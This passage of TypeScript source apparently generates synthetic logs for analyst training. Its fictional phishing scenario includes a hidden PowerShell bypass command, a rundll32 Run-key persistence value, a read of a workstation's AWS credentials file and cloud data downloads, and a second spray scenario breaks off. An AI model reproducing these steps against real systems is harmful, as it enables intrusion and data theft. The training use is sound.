/**
 * Events-only half of the live-feed scenarios in ./scenarios.ts.
 *
 * The dashboard's live feed runs in the browser (attackStories.ts), so what it
 * imports ships in a public /_next/static chunk. The answer key (questions,
 * answers, explanations, IOCs, killchain, narrative) stays in the builder in
 * ./scenarios.ts, which composes this module on the server. Keep anything
 * answer-bearing out of this file: every visitor can read it.
 */
import type { TelemetryEvent } from "./types";
import { makeSha256 } from "./iocs";

/** Telemetry half of `buildPhishingToExfil`: the events and the story title, no answer key. */
export function phishingToExfilEvents() {
  const B = new Date("2026-05-08T09:42:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const victim   = { hostname: "WS-FIN-2847", email: "j.smith@nexacorp.com",   ip: "10.10.20.14" };
  const egress   = "217.177.80.10"; // the company's NAT egress (what Okta and AWS see for the office)
  const c2Domain = "cdn-update-fb76.xyz";
  const c2Ip     = "185.134.140.139";
  // Story-specific infrastructure (not shared with bec / oauth).
  const attackerIp = "193.42.33.71";
  const senderIp   = "141.98.11.54";
  const dllHash  = makeSha256("svchost32_lockbit_loader");
  const docmHash = makeSha256("invoice_q3_final_docm_macro_document");
  const scriptHash = makeSha256("inv_q3_ps1_stage_script");
  const docmPath = "C:\\Users\\jsmith\\Downloads\\Invoice_Q3_Final.docm";
  const scriptPath = "C:\\Users\\jsmith\\AppData\\Local\\Temp\\inv_q3.ps1";
  const psPath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
  const psCmd = `powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File ${scriptPath}`;
  const wordPath = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE";
  const awsKeyId = "AKIA4XJ9PQ2M7EXAMPLE";
  const officeCli = "aws-cli/2.13.25 Python/3.11.6 Windows/10 exe/AMD64 prompt/off command/s3api.list-objects-v2";
  const attackerCli = (cmd: string) => `aws-cli/2.15.30 Python/3.11.8 Linux/6.8.0-31-generic exe/x86_64.ubuntu.22 prompt/off command/${cmd}`;
  // The user's interactive session on the workstation and the processes the chain hangs from.
  const explorerProc = { name: "explorer.exe", pid: 3280, path: "C:\\Windows\\explorer.exe", user: "NEXACORP\\jsmith", integrity: "medium" as const };
  const chromeProc = { name: "chrome.exe", pid: 4612, path: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", parent_name: "explorer.exe", parent_pid: 3280, user: "NEXACORP\\jsmith", integrity: "medium" as const };
  const wordProc = { name: "WINWORD.EXE", pid: 4128, path: wordPath, parent_name: "explorer.exe", parent_pid: 3280, user: "NEXACORP\\jsmith", integrity: "medium" as const };
  const psProc = { name: "powershell.exe", pid: 5512, path: psPath, parent_name: "WINWORD.EXE", parent_pid: 4128, cmdline: psCmd, user: "NEXACORP\\jsmith", integrity: "medium" as const };
  // One firewall session to the C2 server as PAN-OS logs it when the session ends.
  const c2Session = (id: string, ts: string, sport: number, bytesOut: number, bytesIn: number, elapsed: number): TelemetryEvent => ({
    id, ts,
    source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "net_connection", severity: "medium",
    src_ip: victim.ip, dst_ip: c2Ip, dst_port: 443, src_port: sport, hostname: victim.hostname,
    description: `${victim.hostname} opened another outbound HTTPS session to ${c2Ip} (${bytesOut} bytes sent, ${bytesIn} received).`,
    raw: {
      "event.action": "allow",
      "source.ip": victim.ip, "destination.ip": c2Ip, "destination.port": "443",
      "pan.app": "ssl", "pan.action": "allow", "pan.rule": "ALLOW-OUTBOUND-HTTPS",
      "url.category": "Unknown", "pan.elapsed_time": String(elapsed),
      "network.bytes_out": String(bytesOut), "network.bytes_in": String(bytesIn),
      "action_result": "allow",
    },
  });
  // One S3 / STS API call signed with the long-term key.
  const awsCall = (id: string, ts: string, source: string, name: string, ip: string, ua: string, params: Record<string, string>, extra: Record<string, string> = {}): TelemetryEvent => ({
    id, ts,
    source: "cloudtrail", vendor: "AWS CloudTrail", event_type: "cloud_api_call",
    user_email: victim.email, src_ip: ip,
    severity: "informational",
    description: `${name} was called with access key ${awsKeyId} (jsmith-analytics) from ${ip}.`,
    raw: {
      "aws.cloudtrail.eventName": name,
      "aws.cloudtrail.eventSource": source,
      "aws.cloudtrail.userIdentity.type": "IAMUser",
      "aws.cloudtrail.userIdentity.userName": "jsmith-analytics",
      "aws.cloudtrail.userIdentity.accessKeyId": awsKeyId,
      "aws.cloudtrail.sourceIPAddress": ip,
      "aws.cloudtrail.userAgent": ua,
      "aws.cloudtrail.awsRegion": "eu-west-1",
      "event.outcome": "success",
      ...params, ...extra,
    },
  });

  const events: TelemetryEvent[] = [
    {
      id: "evt_01_logon", ts: T(0),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "informational",
      description: "j.smith logged on to WS-FIN-2847 from the office network during working hours.",
      raw: {
        // Windows Security Event 4624 - Successful Logon
        "winlog.event_id": "4624",
        "winlog.channel": "Security",
        "winlog.computer_name": "WS-FIN-2847",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.record_id": "1048297",
        // Subject (the process requesting logon - SYSTEM on interactive logons)
        "winlog.event_data.SubjectUserSid": "S-1-5-18",
        "winlog.event_data.SubjectUserName": "WS-FIN-2847$",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.SubjectLogonId": "0x3E7",
        // New Logon (the account that was logged on)
        "winlog.event_data.TargetUserSid": "S-1-5-21-3421479547-3897544621-1789562108-1103",
        "winlog.event_data.TargetUserName": "jsmith",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.TargetLogonId": "0x8F4A21",
        "winlog.event_data.LogonGuid": "{A1B2C3D4-E5F6-A1B2-C3D4-E5F6A1B2C3D4}",
        // Logon type and process
        "winlog.event_data.LogonType": "2",
        "winlog.event_data.LogonProcessName": "User32",
        "winlog.event_data.AuthenticationPackageName": "Kerberos",
        "winlog.event_data.WorkstationName": "WS-FIN-2847",
        "winlog.event_data.TransmittedServices": "-",
        "winlog.event_data.LmPackageName": "-",
        "winlog.event_data.KeyLength": "0",
        "winlog.event_data.ImpersonationLevel": "%%1833",
        "winlog.event_data.ElevatedToken": "%%1843",
        // Network / process
        "winlog.event_data.IpAddress": "10.10.20.14",
        "winlog.event_data.IpPort": "0",
        "winlog.event_data.ProcessId": "0x44C",
        "winlog.event_data.ProcessName": "C:\\Windows\\System32\\winlogon.exe",
        // ECS fields
        "event.code": "4624",
        "event.action": "logged-in",
        "event.outcome": "success",
        "event.created": "2026-05-08T09:42:00.000Z",
        "user.name": "NEXACORP\\jsmith",
        "user.domain": "NEXACORP",
        "user.id": "S-1-5-21-3421479547-3897544621-1789562108-1103",
        "host.name": "WS-FIN-2847",
        "source.ip": "10.10.20.14",
        "authentication.protocol": "Kerberos",
        "authentication.status": "success",
        "logon.type": "2",
      },
    },
    {
      // The session shell and the browser the user works in, so the process tree below has real roots.
      id: "evt_01b_shell", ts: T(12_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "informational",
      process: { ...explorerProc, parent_name: "userinit.exe", parent_pid: 2744, cmdline: "C:\\Windows\\Explorer.EXE" },
      description: "explorer.exe started for j.smith's interactive session on WS-FIN-2847 after logon.",
      raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "host.name": victim.hostname, "user.name": "NEXACORP\\jsmith" },
    },
    {
      id: "evt_01c_browser", ts: T(2 * MIN + 3_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "informational",
      process: { ...chromeProc, cmdline: "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"" },
      description: "j.smith opened Chrome on WS-FIN-2847.",
      raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "host.name": victim.hostname, "user.name": "NEXACORP\\jsmith" },
    },
    {
      id: "evt_02_phish_email", ts: T(5 * MIN),
      source: "email_gateway", vendor: "Microsoft Defender for Office 365", event_type: "email_received",
      user_email: victim.email, src_ip: senderIp,
      severity: "high", mitre_technique: "T1566.001",
      description: "j.smith received an email with a macro-enabled Word attachment (Invoice_Q3_Final.docm) from nexacorp-vendor.xyz. SPF, DKIM, and DMARC all failed; a transport rule allowed delivery.",
      raw: {
        "event.action": "EmailDelivered", "event.outcome": "success",
        "email.from.address": "support@nexacorp-vendor.xyz",
        "email.to.address": "j.smith@nexacorp.com",
        "email.subject": "Invoice Q3 Final - Action Required",
        "email.attachment.name": "Invoice_Q3_Final.docm",
        "email.direction": "inbound",
        "file.size": "47293",
        "source.ip": senderIp,
        "spf.result": "fail", "dkim.result": "fail", "dmarc.result": "fail",
        // Delivered clean: an allow-rule override delivers without a malware
        // verdict (MDO never shows Malware + Delivered on one row).
        "action_result": "delivered",
        "data.office365.OrgLevelAction": "Allow", "data.office365.OrgLevelPolicy": "Exchange transport rule",
      },
    },
    {
      // The attachment row of the same message - the document's SHA256 (EmailEvents has no hash column).
      id: "evt_02b_attachment", ts: T(5 * MIN),
      source: "email_gateway", vendor: "Microsoft Defender for Office 365", event_type: "email_received",
      user_email: victim.email,
      severity: "informational", mitre_technique: "T1566.001",
      description: "The message's attachment record lists Invoice_Q3_Final.docm (47,293 bytes) with its SHA256.",
      raw: {
        "category": "AdvancedHunting-EmailAttachmentInfo",
        "email.from.address": "support@nexacorp-vendor.xyz",
        "email.to.address": "j.smith@nexacorp.com",
        "email.subject": "Invoice Q3 Final - Action Required",
        "email.attachments.file.name": "Invoice_Q3_Final.docm",
        "email.attachments.file.hash.sha256": docmHash,
        "email.attachments.file.size": 47293,
        "email.direction": "inbound",
        "source.ip": senderIp,
        "action_result": "delivered",
      },
    },
    {
      // The webmail download lands the document in Downloads (the same SHA256 as the attachment record).
      id: "evt_02c_docm_saved", ts: T(5 * MIN + 20_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "low",
      file: { path: docmPath, sha256: docmHash, size: 47293 },
      process: chromeProc,
      description: "chrome.exe on WS-FIN-2847 saved Invoice_Q3_Final.docm from the webmail session to j.smith's Downloads folder (same SHA256 as the email attachment).",
      raw: { "crowdstrike.event_simpleName": "OoxmlFileWritten", "file.path": docmPath, "file.hash.sha256": docmHash, "host.name": victim.hostname, "user.name": "NEXACORP\\jsmith" },
    },
    {
      id: "evt_03_macro_open", ts: T(5 * MIN + 30_000),
      source: "sysmon", vendor: "Microsoft Sysmon", event_type: "process_create",
      user_email: victim.email, hostname: victim.hostname, src_ip: victim.ip,
      severity: "high",
      process: {
        name: "WINWORD.EXE", pid: 4128, parent_name: "explorer.exe", parent_pid: 3280,
        cmdline: `"${wordPath}" "${docmPath}"`,
        user: "NEXACORP\\jsmith", integrity: "medium",
      },
      description: "j.smith opened Invoice_Q3_Final.docm on WS-FIN-2847; WINWORD.EXE launched with the macro's Trust Center warning dismissed moments before it spawned PowerShell.",
      raw: {
        "event.code": "1",
        "winlog.provider_name": "Microsoft-Windows-Sysmon",
        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
        "winlog.event_data.UtcTime": "2026-05-08 09:47:30.118",
        "winlog.event_data.ProcessGuid": "{a1b2c3d4-e5f6-a1b2-0002-c3d4e5f60002}",
        "winlog.event_data.ProcessId": "4128",
        "winlog.event_data.Image": wordPath,
        "winlog.event_data.CommandLine": `"${wordPath}" "${docmPath}"`,
        "winlog.event_data.ParentImage": "C:\\Windows\\explorer.exe",
        "winlog.event_data.ParentProcessId": "3280",
        "winlog.event_data.ParentCommandLine": "C:\\Windows\\Explorer.EXE",
        "winlog.event_data.User": "NEXACORP\\jsmith",
        "winlog.event_data.IntegrityLevel": "Medium",
        "winlog.event_data.Company": "Microsoft Corporation",
        "winlog.event_data.Product": "Microsoft Office",
      },
    },
    {
      // The macro writes the stage-1 script it is about to run.
      id: "evt_03b_script_drop", ts: T(5 * MIN + 30_600),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "medium", mitre_technique: "T1059.001",
      file: { path: scriptPath, sha256: scriptHash, size: 1843 },
      process: wordProc,
      description: "WINWORD.EXE on WS-FIN-2847 wrote inv_q3.ps1 to j.smith's Temp folder, 0.6 seconds before PowerShell ran it.",
      raw: { "crowdstrike.event_simpleName": "NewScriptWritten", "file.path": scriptPath, "file.hash.sha256": scriptHash, "host.name": victim.hostname, "user.name": "NEXACORP\\jsmith" },
    },
    {
      id: "evt_04_powershell", ts: T(5 * MIN + 31_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1059.001",
      description: "WINWORD.EXE on WS-FIN-2847 spawned a hidden PowerShell process with execution policy bypass, running a script from jsmith's Temp folder.",
      process: psProc,
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "event.action": "process_created",
        // Process - powershell.exe
        "process.pid": "5512",
        "process.executable": "\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "process.name": "powershell.exe",
        "process.command_line": psCmd,
        "process.hash.sha256": "de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1848474f30",
        "process.hash.md5": "7353f60b1739074eb17c5f4dddefe239",
        "process.integrity_level": "MEDIUM_INTEGRITY_LEVEL",
        // Parent - WINWORD.EXE
        "process.parent.pid": "4128",
        "process.parent.name": "WINWORD.EXE",
        "process.parent.executable": "\\Device\\HarddiskVolume3\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        "process.parent.command_line": `"${wordPath}" "${docmPath}"`,
        "process.parent.hash.sha256": "88fa52d1122deaf6437d901edeec041b767562964c57f321c61599326ab119d0",
        // Grandparent - explorer.exe
        "process.grandparent.name": "explorer.exe",
        "process.grandparent.pid": "3280",
        "process.grandparent.executable": "\\Device\\HarddiskVolume3\\Windows\\explorer.exe",
        // User
        "user.name": "NEXACORP\\jsmith",
        "user.id": "S-1-5-21-3421479547-3897544621-1789562108-1103",
        // Host
        "host.name": "WS-FIN-2847",
        "host.ip": "10.10.20.14",
      },
    },
    // ── First alert: the EDR detection on the Office → PowerShell parent/child pair ──
    {
      id: "evt_phish_edr_alert", ts: T(5 * MIN + 33_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "edr_alert",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1059.001", is_detection: true,
      process: psProc,
      description: "Falcon raised a High detection on WS-FIN-2847: WINWORD.EXE launched a hidden powershell.exe with execution policy bypass. Disposition: detection only, process not stopped.",
      raw: {
        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
        "crowdstrike.DetectName": "OfficeAppSpawnsScriptInterpreter",
        "crowdstrike.DetectDescription": "A Microsoft Office application launched PowerShell with a hidden window and execution policy bypass.",
        "crowdstrike.SeverityName": "High",
        "crowdstrike.Tactic": "Execution",
        "crowdstrike.Technique": "Command and Scripting Interpreter: PowerShell",
        "threat.technique.id": "T1059",
        "threat.technique.subtechnique.id": "T1059.001",
        "crowdstrike.PatternDispositionDescription": "Detection, No Action",
        "crowdstrike.FileName": "powershell.exe",
        "crowdstrike.ParentImageFileName": "WINWORD.EXE",
        "crowdstrike.GrandparentImageFileName": "explorer.exe",
        "crowdstrike.SensorId": "97f45e3afc637a1614ec711f50bb1286",
        "crowdstrike.NetworkContainmentState": "Not Contained",
        "event.action": "alert",
        "process.pid": "5512",
        "process.parent.pid": "4128",
        "user.name": "NEXACORP\\jsmith",
        "host.name": "WS-FIN-2847",
        "host.ip": "10.10.20.14",
      },
    },
    // ── CORRELATED: DNS query for C2 domain just before beacon ────────────────────
    {
      id: "evt_phish_dns_c2", ts: T(5 * MIN + 42_000),
      source: "sysmon", vendor: "Microsoft Sysmon",
      event_type: "dns_query", severity: "high",
      hostname: victim.hostname, src_ip: victim.ip, user_email: victim.email,
      mitre_technique: "T1071.001",
      process: psProc,
      dns: { query: c2Domain, query_type: "A", response: c2Ip, rcode: "NOERROR" },
      description: `WS-FIN-2847 resolved ${c2Domain}, a domain registered 3 days ago.`,
      raw: {
        "event.code": "22",
        "winlog.provider_name": "Microsoft-Windows-Sysmon",
        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
        "winlog.event_data.UtcTime": "2026-05-08 09:47:42.203",
        "winlog.event_data.ProcessGuid": "{a1b2c3d4-e5f6-a1b2-0001-c3d4e5f60001}",
        "winlog.event_data.ProcessId": "5512",
        "winlog.event_data.QueryName": c2Domain,
        "winlog.event_data.QueryStatus": "0",
        "winlog.event_data.QueryResults": `type: 1 ${c2Ip};`,
        "winlog.event_data.Image": psPath,
        "host.name": victim.hostname,
      },
    },

    // ── CORRELATED: the internal resolver's own record of the same lookup ─────────
    {
      id: "evt_phish_dns_server", ts: T(5 * MIN + 42_000),
      source: "dns", vendor: "Windows DNS Server",
      event_type: "dns_query", severity: "medium",
      hostname: victim.hostname, src_ip: victim.ip,
      dns: { query: c2Domain, query_type: "A", rcode: "NOERROR" },
      description: `The internal DNS server answered ${victim.hostname}'s A query for ${c2Domain} with ${c2Ip}.`,
      raw: { "dns.question.name": c2Domain, "dns.question.type": "A",
             "dns.response_code": "NOERROR", "dns.resolved_ip": c2Ip,
             "source.ip": victim.ip },
    },

    // ── CORRELATED: Firewall event - PowerShell connecting to C2 IP ───────────────
    {
      id: "evt_phish_fw_c2", ts: T(5 * MIN + 46_000),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS",
      event_type: "net_connection", severity: "high",
      mitre_technique: "T1071.001",
      src_ip: victim.ip, dst_ip: c2Ip, dst_port: 443,
      hostname: victim.hostname,
      description: `WS-FIN-2847 opened an outbound HTTPS connection to ${c2Ip} - the resolved IP for the newly-seen domain.`,
      raw: {
        "event.action": "allow",
        "source.ip": victim.ip,
        "destination.ip": c2Ip,
        "destination.port": "443",
        "pan.app": "ssl",
        "pan.action": "allow",
        "pan.rule": "ALLOW-OUTBOUND-HTTPS",
        "url.category": "Unknown",
        "network.bytes_out": "1240",
        "network.bytes_in": "4096",
        "action_result": "allow",
      },
    },
    {
      id: "evt_06_dll_drop", ts: T(8 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1027",
      file: { path: "C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost32.dll", sha256: dllHash, size: 143360 },
      process: psProc,
      description: "powershell.exe wrote an unsigned DLL named svchost32.dll to jsmith's Temp folder on WS-FIN-2847.",
      raw: {
        "crowdstrike.event_simpleName": "NewExecutableWritten",
        // Event
        "event.code": "NewExecutableWritten",
        "event.action": "file_created",
        "event.created": "2026-05-08T09:50:00.412Z",
        // File
        "file.path": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost32.dll",
        "file.name": "svchost32.dll",
        "file.extension": ".dll",
        "file.size": "143360",
        "file.type": "DLL",
        "file.created": "2026-05-08T09:50:00.412Z",
        "file.hash.sha256": dllHash,
        "file.hash.md5": "9269929cbaf1c676b7acd2e3e45497f1",
        // PE metadata
        "pe.original_filename": "(not present)",
        "pe.company_name": "(not present)",
        "pe.description": "(not present)",
        "pe.signed": "false",
        "pe.imphash": "f34d5f2d2d15c7c3e4f6b1a2d3c4e5f6",
        "pe.entropy": "7.8",
        "pe.compile_time": "2026-05-07T22:14:36Z",
        // Writing process - powershell.exe
        "process.name": "powershell.exe",
        "process.pid": "5512",
        "process.executable": "\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "process.command_line": psCmd,
        "process.hash.sha256": "de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1848474f30",
        // User
        "user.name": "NEXACORP\\jsmith",
        "user.id": "S-1-5-21-3421479547-3897544621-1789562108-1103",
        // Host
        "host.name": "WS-FIN-2847",
        "host.ip": "10.10.20.14",
      },
    },
    {
      id: "evt_07_reg_persist", ts: T(8 * MIN + 20_000),
      source: "sysmon", vendor: "Microsoft Sysmon", event_type: "registry_set",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1547.001",
      process: psProc,
      registry: {
        path: "HKU\\S-1-5-21-3421479547-3897544621-1789562108-1103\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        key: "WindowsUpdater",
        value: "rundll32.exe C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost32.dll,DllMain",
      },
      description: "PowerShell set an HKCU Run value named WindowsUpdater on WS-FIN-2847 that launches rundll32.exe against svchost32.dll.",
      raw: {
        "event.code": "13",
        "winlog.provider_name": "Microsoft-Windows-Sysmon",
        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
        "winlog.event_data.UtcTime": "2026-05-08 09:50:20.118",
        "winlog.event_data.EventType": "SetValue",
        "winlog.event_data.ProcessGuid": "{a1b2c3d4-e5f6-a1b2-0001-c3d4e5f60001}",
        "winlog.event_data.ProcessId": "5512",
        "winlog.event_data.Image": psPath,
        "winlog.event_data.Details": "rundll32.exe C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost32.dll,DllMain",
        "winlog.event_data.User": "NEXACORP\\jsmith",
      },
    },
    // ── The implant stays alive: five more check-ins to the same server at a steady cadence ──
    c2Session("evt_phish_fw_c2_b1", T(13 * MIN + 10_000), 57412, 1180, 4096, 3),
    c2Session("evt_phish_fw_c2_b2", T(18 * MIN + 10_000), 57688, 1260, 4100, 3),
    c2Session("evt_phish_fw_c2_b3", T(23 * MIN + 12_000), 57931, 1210, 4096, 4),
    c2Session("evt_phish_fw_c2_b4", T(28 * MIN + 11_000), 58140, 1240, 4104, 3),
    c2Session("evt_phish_fw_c2_b5", T(33 * MIN + 13_000), 58377, 1190, 4096, 3),
    // ── One goal: the AWS key on this workstation → the S3 export bucket ────
    // (2026-10-02 review: the LSASS dump, RC4 TGT, SMB hop, Entra sign-in and
    // inbox rule were three unconnected goals; they were cut so every row below
    // leads to the S3 download.) The same PowerShell process that
    // resolved the new domain reads the CLI profile; the key it holds is then
    // used from outside, and the access key id threads 11c → 12.
    {
      id: "evt_11b_aws_profile_read", ts: T(38 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_access",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1552.001",
      process: psProc,
      file: { path: "C:\\Users\\jsmith\\.aws\\credentials", size: 217 },
      description: `powershell.exe on ${victim.hostname} opened C:\\Users\\jsmith\\.aws\\credentials.`,
      raw: {
        "crowdstrike.event_simpleName": "FileOpenInfo",
        "crowdstrike.FileName": "credentials",
        "crowdstrike.FilePath": "C:\\Users\\jsmith\\.aws\\",
        "crowdstrike.ContextBaseFileName": "powershell.exe",
        "crowdstrike.UserName": "NEXACORP\\jsmith",
        "file.path": "C:\\Users\\jsmith\\.aws\\credentials",
        "file.size": 217,
        "event.action": "FileOpenInfo",
        "event.outcome": "success",
      },
    },
    // The credential file's size rides out in the next session: a little more than a plain check-in.
    c2Session("evt_phish_fw_c2_b6", T(38 * MIN + 30_000), 58602, 1900, 4096, 3),
    awsCall("evt_11c_sts_identity", T(40 * MIN), "sts.amazonaws.com", "GetCallerIdentity", attackerIp, attackerCli("sts.get-caller-identity"), {}),
    awsCall("evt_11d_list_buckets", T(41 * MIN), "s3.amazonaws.com", "ListBuckets", attackerIp, attackerCli("s3api.list-buckets"), {}),
    awsCall("evt_11e_list_objects", T(42 * MIN), "s3.amazonaws.com", "ListObjectsV2", attackerIp, attackerCli("s3api.list-objects-v2"), {
      "aws.cloudtrail.requestParameters.bucketName": "nexacorp-crm-exports",
      "aws.cloudtrail.requestParameters.prefix": "exports/",
    }),
    {
      id: "evt_12_s3_exfil", ts: T(43 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail", event_type: "cloud_api_call",
      user_email: victim.email, src_ip: attackerIp,
      // T1530 Data from Cloud Storage: a GetObject against the victim's own
      // bucket (T1567.002 is an upload TO an attacker's cloud storage).
      severity: "critical", mitre_technique: "T1530",
      network: { bytes_out: 184_000_000 },
      description: `Access key AKIA4XJ9PQ2M7EXAMPLE (jsmith-analytics) read exports/customer-financial-data-2026.zip (184 MB) from bucket nexacorp-crm-exports, from ${attackerIp}.`,
      raw: {
        "event.action": "GetObject", "event.outcome": "success",
        "aws.cloudtrail.requestParameters.bucketName": "nexacorp-crm-exports",
        "aws.cloudtrail.requestParameters.key": "exports/customer-financial-data-2026.zip",
        "aws.cloudtrail.sourceIPAddress": attackerIp,
        "aws.cloudtrail.awsRegion": "eu-west-1",
        // Field names aligned to eventName/eventSource, matching the two
        // CloudTrail events that now precede this one - the same scenario was
        // using snake_case here and camelCase there.
        "aws.cloudtrail.eventName": "GetObject",
        "aws.cloudtrail.eventSource": "s3.amazonaws.com",
        // The access key is what closes the pivot: same key as evt_11c, read
        // off disk in evt_11b. Without it the analyst could see the download
        // but never establish WHICH credential performed it.
        "aws.cloudtrail.userIdentity.type": "IAMUser",
        "aws.cloudtrail.userIdentity.userName": "jsmith-analytics",
        "aws.cloudtrail.userIdentity.accessKeyId": awsKeyId,
        "aws.s3.bucket.name": "nexacorp-crm-exports",
        "storage.object.name": "exports/customer-financial-data-2026.zip",
        "network.bytes_out": "184000000",
        "cloud.provider": "aws", "cloud.region": "eu-west-1",
        "source.ip": attackerIp,
        "user.name": "jsmith-analytics",
        "user_agent.original": attackerCli("s3api.get-object"),
        "aws.cloudtrail.userAgent": attackerCli("s3api.get-object"),
      },
    },

    // ── CORRELATED: Baseline - j.smith normal morning Okta login from the office ─────
    // (the account's normal location and the office NAT, to contrast with 11c/12's source IP)
    {
      id: "evt_phish_baseline_01", ts: T(-30 * MIN), is_baseline: true,
      source: "okta", vendor: "Okta",
      event_type: "auth_success", severity: "informational",
      user_email: victim.email,
      src_ip: egress,
      description: "j.smith logged in to Okta from the office network in Tel Aviv on a registered device.",
      raw: {
        "okta.eventType": "user.session.start",
        "okta.outcome.result": "SUCCESS",
        "okta.actor.login": victim.email,
        "okta.client.ipAddress": egress,
        "okta.client.geographicalContext.country": "IL",
        "okta.client.geographicalContext.city": "Tel Aviv",
        "okta.authenticationContext.authType": "PASSWORD_IDP",
        "okta.risk.level": "LOW",
        "GeoLocation.country_name": "Israel",
        "GeoLocation.city_name": "Tel Aviv",
        "GeoLocation.location.lat": 32.0853,
        "GeoLocation.location.lon": 34.7818,
        "event.action": "logged-in", "event.outcome": "success",
        "source.ip": egress,
        "user.email": victim.email,
      },
    },
    // ── Baseline - the same key used the way its owner uses it: from the office, by the CLI on this workstation ──
    { ...awsCall("evt_phish_baseline_ct1", "2026-05-07T09:10:22.000Z", "s3.amazonaws.com", "ListObjectsV2", egress, officeCli, {
        "aws.cloudtrail.requestParameters.bucketName": "nexacorp-crm-exports",
        "aws.cloudtrail.requestParameters.prefix": "exports/",
      }), is_baseline: true, description: "jsmith-analytics listed exports/ in nexacorp-crm-exports from the office network, the way the analytics job does each morning." },
    { ...awsCall("evt_phish_baseline_ct2", "2026-05-08T08:55:41.000Z", "s3.amazonaws.com", "ListObjectsV2", egress, officeCli, {
        "aws.cloudtrail.requestParameters.bucketName": "nexacorp-crm-exports",
        "aws.cloudtrail.requestParameters.prefix": "exports/",
      }), is_baseline: true, description: "jsmith-analytics listed exports/ in nexacorp-crm-exports from the office network, the way the analytics job does each morning." },
  ];

  return { title: "Unassigned EDR detection on a finance workstation", events, T, MIN, victim, c2Domain, c2Ip, attackerIp, senderIp, dllHash, docmHash };
}

/** Telemetry half of `buildBecScenario`: the events and the story title, no answer key. */
export function becScenarioEvents() {
  const B = new Date("2026-05-08T08:00:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const SEC = 1_000;

  const victim      = { hostname: "LAPTOP-FIN-04", email: "l.harris@nexacorp.com", ip: "10.10.30.21" };
  // Story-specific infrastructure (not shared with phishing / oauth).
  const attackerIp  = "77.83.247.146";
  const sprayIp     = "158.131.159.30";
  const adfsIp      = "10.10.1.15";
  const egress      = "217.177.80.10"; // the company's NAT egress
  const tenant      = "3f7e2a1b-9c8d-4e5f-6a7b-8c9d0e1f2a3b";
  const attackerUa  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";
  const officeUa    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36";
  // The Entra session the attacker's sign-in created: the mailbox audit records below carry the same id.
  const harrisSession = "7b3c1e0a-5d29-4c8e-9a41-0f6d2e8b1a77";
  const fraudMsgId  = "<cabcd3f7e2a1b9c8d4e5f6a7b8c9d0e1f2a3b4c5@mail.outlook.com>";
  const guid = (n: number) => `e5f6a1b2-c3d4-4e5f-a1b2-${n.toString(16).padStart(12, "0")}`;

  // ── The spray, as the AD FS server saw it ────────────────────────────────────
  // 19 logon attempts in four minutes, 10 accounts, three rounds: 17 fail (two accounts reach the
  // 3-failure lockout, two accounts' passwords are right) and the two correct guesses succeed.
  const accounts: Record<string, string> = {
    "a.nelson": "A Nelson", "r.garcia": "R Garcia", "p.johnson": "Patricia Johnson", "l.harris": "Laura Harris", "t.brooks": "T Brooks",
